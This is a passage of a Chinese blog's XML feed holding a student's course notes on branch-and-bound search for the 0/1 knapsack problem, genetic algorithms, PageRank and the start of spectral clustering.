id="具体过程">具体过程</h2><ol><li>确定合理的<code>限界函数</code>，以及目标函数的<code>[down,up]</code></li><li>依次从活结点表中选取使目标函数的值取得极值的结点成为当前扩展结点（广搜）</li><li>依次搜索该结点的所有孩子结点，分别估算这些孩子结点的目标函数的可能取值</li><li>丢弃目标函数可能取得的值超出目标函数的界对应的子结点，因为其不会产生更好的解</li><li>将其他结点加入活结点列表</li><li>重复上述步骤，直到找到解</li></ol><h2 id="叶子结点与解">叶子结点与解</h2><p>随着遍历，活结点表中所估算的目标函数的界越来越接近问题的最优解，广搜过程有如下状态：</p><ol><li>搜索到叶子：得到一个解，如果其目标函数值是活结点列表中的极值，则它就是最优解</li><li>否则，根据该节点调整目标函数的上/下界</li><li>更新队列（活结点表）：将超出目标函数界的结点丢弃</li><li>然后从活结点表中选取使目标函数取得极值的结点继续进行扩展</li></ol><h1 id="01背包问题的分支界限法">01背包问题的分支界限法</h1><h2 id="界限条件">界限条件</h2><p>判断将某个物品<code>i</code>放入背包是否会超重，如果不超重，则可以对该”选择将物品<code>i</code>放入的结点“继续搜索，否则丢弃该结点<br>另一方面，如果选择不放入物品<code>i</code>，则自然不会超重，可以继续对该”选择不将物品<code>i</code>放入的结点“继续搜索</p><h2 id="上界估算优化">上界估算优化</h2><p>我们维护每个结点对应的<code>上界</code>，这个上界代表着，以该节点做出的决策继续，理想情况下能获得的最大价值。<br>为了计算这个上界，对于01背包，显然可以计算每个物品的“性价比”，即单位重量的价值。<br>之后，每次选取都优先选择性价比最高的物品，并更新上界，然后，在搜索活结点列表时，每次取出上界最高的结点进行搜索，即使用优先队列。</p><h2 id="搜索过程">搜索过程</h2><ol><li>每次都从优先队列中找到当前上限值最大的结点，遍历并生成该结点的子结点（左孩子放入该物品，右孩子不放入该物品），如果不满足界限条件（超重）则丢弃。</li><li>将子结点入队，准备下一次遍历。</li><li>如果弹出的结点是叶子，那么该结点就是最优解。</li></ol><h1 id="优先队列法求解最大化问题的一般步骤">优先队列法求解最大化问题的一般步骤</h1><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240703175237.png" alt="image.png|675"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240703175252.png" alt="image.png|525"></p><p>其中，确定最优解的分量可以有2种方法：</p><ul><li>保存迭代路径</li><li>回溯到根节点，以获取分量</li></ul><h1 id="分支界限法的性能">分支界限法的性能</h1><p>分支限界法和回溯法实际上都属于穷举法，遍历具有指数阶个结点的解空间树，在最坏情况下，时间复杂性肯定为<code>指数阶</code>。</p><p>与回溯法不同的是，分支限界法首先扩展解空间树中的上层结点，并采用限界函数，有利于实行大范围剪枝，同时，根据限界函数不断调整搜索方向，选择最有可能取得最优解的子树优先进行搜索。</p><p>分支界限法使用了一些特殊的方法来提高搜索效率，当然这也使得算法设计变得更为复杂，具体体现如下：</p><ul><li>限界函数：一个更好的限界函数通常需要花费更多的时间计算相应的目标函数值，而且对于具体的问题实例，通常需要进行大量实验，才能确定一个好的限界函数；</li><li>算法设计较为复杂:为了从叶子结点求出对应最优解的各分量，需保存该结点到根结点的路径，或者在搜索过程中构建经过的树结构；</li><li>需要较大的存储空间:算法要维护一个待处理结点(活结点)表，并且需要在活结点表中快速查找取得极值的结点，等等。在最坏情况下，需要的空间复杂性是指数阶。</li></ul><h1 id="队列式分支界限法">队列式分支界限法</h1><p>首先检测当前扩展结点的左儿子结点是否为可行结点，如果是则将其加入到活结点队列中；<br>然后将其右儿子结点加入到活结点队列中，因为右儿子结点一定是可行结点；<br>2个儿子结点都产生后，当前扩展结点被舍弃。</p><p>活结点队列中的队首元素被取出作为当前扩展结点；<br>由于队列中每一层结点之后都有一个尾部标记-1，故在取队首元素时，活结点队列一定不空；<br>当取出的元素是-1时，再判断当前队列是否为空。如果队列非空，则将尾部标记-1加入活结点队列，算法开始处理下一层的活结点。</p><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 分支界限法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>遗传算法</title>
      <link href="/20245b86df705a86/"/>
      <url>/20245b86df705a86/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p><code>启发式算法</code>，或称策略法、助发现法、启发力、捷思法等。是一种实用的解决问题的方法，该种方法不能保证是最佳的、完美的或理性的，但仍然足以达到立即的、短期的目标或近似值。特别是在不可能找到最佳解决方案或不切实际的情况下，可以使用启发式方法来加快找到满意解决方案的过程。该方法可以是减轻决策过程认知负荷的心理快捷方式。</p><p>启发式算法解释了在知识有限（信息不完整）和时间有限的情况下，得出可能陈述或可行解决方案的艺术。它描述了一种分析程序，在该程序中，在对系统了解有限的情况下，在推定结论的帮助下做出有关系统的陈述。 由此得出的结论往往偏离最优解。启发法的质量可以透过将其与最佳解决方案进行比较来确定。</p><p>启发式算法的特点：<br>计算机科学的两大基础目标，就是发现可证明其执行效率良好且可得最佳解或次佳解的算法。而启发式算法则试图一次提供一个或全部目标。例如它常能发现很不错的解，但也没办法证明它不会得到较坏的解；它通常可在合理时间解出答案，但也没办法知道它是否每次都可以这样的速度求解。</p><p>有时候人们会发现在某些特殊情况下，启发式算法会得到很坏的答案或效率极差，然而造成那些特殊情况的数据结构，也许永远不会在现实世界出现。因此现实世界中启发式算法很常用来解决问题。<code>启发式算法处理许多实际问题时通常可以在合理时间内得到不错的答案</code>（但并不保证一定是最优解）。</p><h1 id="tsp问题">TSP问题</h1><p>TSP问题被归类为NP-hard问题，因为它满足NP-hard的定义：任何NP问题都可以在多项式时间内归约到它。<br>对于TSP问题的NP-hard性质的证明，通常是通过从一个已知的NP-complete问题（如哈密顿回路问题）进行归约来完成的。</p><p>// 可能有其他概念问题要考</p><h1 id="遗传算法">遗传算法</h1><h2 id="概述">概述</h2><p><code>遗传算法</code>是一类借鉴生物界自然选择和自然遗传机制的随机化搜索算法。</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627161038.png" alt="image.png|600"></p><p>各个概念对应到遗传算法中：</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627161322.png" alt="image.png|600"></p><h2 id="主要特征">主要特征</h2><ul><li>进化：进化体现在<code>解的编码</code>上，也就是生物学中的<code>染色体</code>，将问题的解通过某种方式进行编码（例如二进制编码），各种问题都在编码上进行。另一方面，如何编码也是遗传算法的一个主题。</li><li>适应函数：根据<code>自然选择规律</code>来决定哪些染色体能产生超过平均数的后代。根据实际优化问题的目标来人为地构造<code>适应函数</code>来计算每个个体（解或染色体）的适应度，适应度更好的染色体将产生超过平均数的后代。</li><li>交配：当染色体结合时，双亲的遗传基因的结合使得子女保持父母的特征。</li><li>变异：当染色体结合后，<code>随机</code>的<code>变异</code>会造成子代同父代的不同。</li></ul><h2 id="主要步骤">主要步骤</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627162956.png" alt="image.png|725"></p><h2 id="基本遗传算法">基本遗传算法</h2><p>基本遗传算法（SGA，又称简单遗传算法或标准遗传算法），是由Goldberg总结出的一种最基本的遗传算法，其遗传进化操作过程简单，容易理解，是其它一些遗传算法的雏形和基础。</p><p>主要构成：</p><ul><li>编码：产生初始种群</li><li>适应度函数：计算个体的适应度</li><li>遗传算子：模拟生物学上的行为（选择、交叉、变异）</li><li>运行参数</li></ul><h3 id="编码与初始种群">编码与初始种群</h3><p>GA算法通过某种编码机制把对象抽象为由特定符号按一定顺序排成的串，例如<code>SGA</code>使用二进制串进行编码。<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627163345.png" alt="image.png|550"></p><p>SGA采用随机方法生成若干个个体的集合，该集合称为<code>初始种群</code>。初始种群中个体的数量称为<code>种群规模</code>。</p><h3 id="适应度函数">适应度函数</h3><p>遗传算法对一个个体（解）的好坏用<code>适应度函数值</code>来评价。</p><p>适应度函数值越大，解的质量越好。适应度函数是遗传算法进化过程的驱动力，也是进行自然选择的唯一标准，<code>它的设计应结合求解问题本身的要求而定。</code></p><h3 id="选择算子">选择算子</h3><p>遗传算法使用<code>选择运算</code>来实现对群体中的个体进行优胜劣汰操作：适应度高的个体被遗传到下一代群体中的概率大；而适应度低的个体，被遗传到下一代群体中的概率小。<br>选择操作的任务就是按某种方法从父代群体中选取一些个体，遗传到下一代群体。SGA中选择算子采用<code>轮盘赌选择方法</code>。</p><p><code>轮盘赌选择</code>又称<code>比例选择算子</code>，其基本思想是：各个个体被选中的概率与其适应度函数值大小成正比。<br>设群体大小为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>，个体<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>的适应度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">F_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，则个体<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>被选中遗传到下一代群体的概率为：</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627163603.png" alt="image.png|350"><br>然后根据各个概率，就对应一个“饼状图”，也就是所谓的“轮盘”。<br>接下来，进行对每一个个体的选择。随机生成<code>[0,1]</code>之间的随机数，来从饼状图中进行匹配（相当于一个轮盘指针），选中的个体将会被遗传下去。</p><h3 id="交叉算子">交叉算子</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627164040.png" alt="image.png|525"><br>其实就相当于生物学中，精子和卵子之间的基因重组。<br>在<code>SGA</code>中，使用单点交叉算子：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627164200.png" alt="image.png|475"></p><h3 id="变异算子">变异算子</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627172043.png" alt="image.png|475"></p><p><code>SGA</code>中使用基本位变异算子，即将编码串中的某一位或某几位基因取反。<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627172226.png" alt="image.png|475"></p><h3 id="运行参数">运行参数</h3><p>运行参数用于在算法运行时指定一些基本的参数，例如各种概率。<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627172302.png" alt="image.png|475"></p><h2 id="遗传算法的特点">遗传算法的特点</h2><ul><li>群体搜索，易于并行化处理</li><li>不是盲目穷举，而是启发式搜索</li><li>适应度函数不受连续、可微等条件的约束，适用范围很广</li></ul><h2 id="遗传算法的描述">遗传算法的描述</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240627173036.png" alt="image.png|650"></p><h2 id="遗传算法的数学基础">遗传算法的数学基础</h2><p>略。。。应该不考？</p><h2 id="遗传算法的收敛性分析">遗传算法的收敛性分析</h2><p>遗传算法要实现全局收敛，首先要求<code>任意初始种群经有限步都能到达全局最优解</code>，其次<code>算法必须由保优操作来防止最优解的遗失</code>。与算法收敛性有关的因素主要包括种群规模、选择操作、交叉概率和变异概率。</p><h3 id="种群规模对收敛性的影响">种群规模对收敛性的影响</h3><ul><li>种群太小不能提供足够的采样点，以致算法性能很差</li><li>种群太大，尽管可以增加优化信息，阻止早熟收敛的发生，但无疑会增加计算量，造成收敛时间太长，表现为收敛速度缓慢</li></ul><h3 id="选择操作对收敛性的影响">选择操作对收敛性的影响</h3><p>选择操作使高适应度个体能够以更大的概率生存，从而提高了遗传算法的全局收敛性。</p><p>如果在算法中采用最优保存策略，即将父代群体中最佳个体保留下来，不参加交叉和变异操作，使之直接进入下一代，最终可使遗传算法以概率1收敛于全局最优解。</p><h3 id="交叉概率对收敛性的影响">交叉概率对收敛性的影响</h3><p>交叉操作实质上是在解空间中进行有效搜索。但是：</p><ul><li>交叉概率太大时，种群中个体更新很快，会造成高适应度值的个体很快被破坏掉</li><li>交叉概率太小时，交叉操作很少进行，从而会使搜索停滞不前，造成算法的不收敛</li></ul><h3 id="变异概率对收敛性的影响">变异概率对收敛性的影响</h3><p>变异操作是对种群模式的扰动，有利于增加种群的多样性。但是：</p><ul><li>变异概率太小则很难产生新模式</li><li>变异概率太大则会使遗传算法成为随机搜索算法</li></ul><h2 id="遗传算法的局限性">遗传算法的局限性</h2><ul><li>GA在进化搜索过程中， 每代总要维持一定规模的群体，则：<ul><li>若群体规模太小，含有的信息量也少，不能使算法得到充分发挥</li><li>群体规模大，包含的信息量也大，但计算次数会激剧增加，因而限制了算法的使用</li></ul></li><li>早熟问题：即在解的搜索成熟前就已经收敛，原因有：<ul><li>交叉算子使群体中的染色体具有<code>局部相似性</code>，父代染色体的信息交换量小，从而使搜索停滞不前</li><li>变异概率又太小，以至于不能使搜索转向其它的解空间进行搜索。GA的爬山能力差，也是由于变异概率低造成的</li></ul></li></ul><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 启发式算法 </tag>
            
            <tag> 遗传算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复杂网络</title>
      <link href="/202439bb7e46fd61/"/>
      <url>/202439bb7e46fd61/</url>
      
        <content type="html"><![CDATA[<h1 id="pagerank算法">PageRank算法</h1><p>注：参考自<a href="https://blog.csdn.net/weixin_40431584/article/details/105561398">手把手图文并茂教你掌握 PageRank 算法-CSDN博客</a>、<a href="https://zh.wikipedia.org/wiki/PageRank">PageRank - 维基百科，自由的百科全书</a><a href="https://zh.wikipedia.org/wiki/PageRank">PageRank - 维基百科，自由的百科全书</a>、<a href="https://www.bilibili.com/video/BV1FZ421M7dm/?spm_id_from=333.337.search-card.all.click&amp;vd_source=33f14fc7c332288da6dec7ab745ca78b">谷歌PageRank算法的工作原理：理解搜索引擎排名的关键 - Spanning Tree_哔哩哔哩_bilibili</a></p><h2 id="概述">概述</h2><p><code>PageRank算法</code>是Google创始人Larry Page和Sergey Brin在斯坦福大学时提出的，又叫PR。是对搜索引擎搜索结果中的网页进行排名的一种算法。PR 值是表示一个网页重要性的因子。</p><p>PageRank本质上是一种以网页之间的超链接个数和质量作为主要因素粗略地分析网页的重要性的算法。其基本假设是：</p><ul><li>数量假设：更重要的页面往往更多地被其他页面引用。也就是说，一个网页接受到的其他网页指向的入链（in-links）越多，说明该网页越重要。</li><li>质量假设：当一个质量高的网页指向（out-links）一个网页，说明这个被指的网页重要。其将从A页面到B页面的链接解释为“A页面给B页面投票”，并根据投票来源（甚至来源的来源，即链接到A页面的页面）和投票对象的等级来决定被投票页面的等级。简单的说，一个高等级的页面可以提升其他低等级的页面。</li></ul><h2 id="基本过程">基本过程</h2><p>每个网页都有一定的票数，初始为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>n</mi><mtext>为网页总数</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1/n,(n为网页总数)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mord mathdefault">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">网</span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">总</span><span class="mord cjk_fallback">数</span><span class="mclose">)</span></span></span></span>，每次循环中都尝试对其出链指向的网页进行投票，投票的方法是将自己的票数按照出链数量平分，然后将其加到其所指向的页面。</p><p>转换一下关注对象，每轮循环计算每个网页的新票数，就是计算一个新的PR贡献值加到自己当前的PR上，公式如下：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>R</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mfrac><mrow><mi>P</mi><mi>R</mi><mo stretchy="false">(</mo><mi>T</mi><mi>i</mi><msub><mo stretchy="false">)</mo><mi>i</mi></msub></mrow><mrow><mi>L</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">PR(a)i+1=∑_{i=1}^n\frac{PR(Ti)_i}{L(T_i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>其中：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>R</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">PR(T_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>：网页a的某个入链对应的网页<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的PR值（这个网页所能为其他网页贡献的总PR值）</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(T_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>：这个网页<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">T_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的总出链数（因为要平分其PR值）</li></ul><p>例如：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623142300.png" alt="image.png|675"></p><p>此外，这个计算过程也可以使用矩阵来描述：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623142628.png" alt="image.png"></p><p>另一方面，由于有的网页并没有出链，它们会将其他网页的PR值逐渐“吞噬掉”：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623142915.png" alt="image.png|550"><br>解决办法是认为此类节点链接到集合中所有的网页（无论是否相关），使得这类网页的PR值将被所有网页均分。</p><p>此外，使用一个阻尼系数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><mn>0.85</mn></mrow><annotation encoding="application/x-tex">d=0.85</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">8</span><span class="mord">5</span></span></span></span>，表示任意时刻，用户访问到某页面后继续访问下一个页面的概率，相对应地，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>−</mtext><mi>𝑑</mi><mo>=</mo><mn>0.15</mn></mrow><annotation encoding="application/x-tex">1−𝑑=0.15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">−</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mord">5</span></span></span></span>则是用户停止点击，随机浏览新网页的概率。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>𝑑</mi></mrow><annotation encoding="application/x-tex">𝑑</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span> 的大小由一般上网者使用浏览器书签功能的频率的平均值估算得到。这个随机值能够避免算法只能在搜索结果的一个子图（该子图中所有网页均没有出链能到达其他的网页）中徘徊。</p><p>大致的过程如上，至于具体的公式未总结（回头再说吧，说是考概念题，具体公式可能不考？）</p><h1 id="谱聚类">谱聚类</h1><h2 id="基本概念">基本概念</h2><p>无向带权图：</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623153614.png" alt="image.png|575"><br>拉普拉斯矩阵：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623153657.png" alt="image.png|575"><br>其中A为邻接矩阵。</p><p>无向图切图：<br>对于无向图G的切图，我们的目标是将图G(V,E)切成相互没有连接的k个子图，每个子图点的集合为：<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>A</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">A_1,A_2,…,A_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 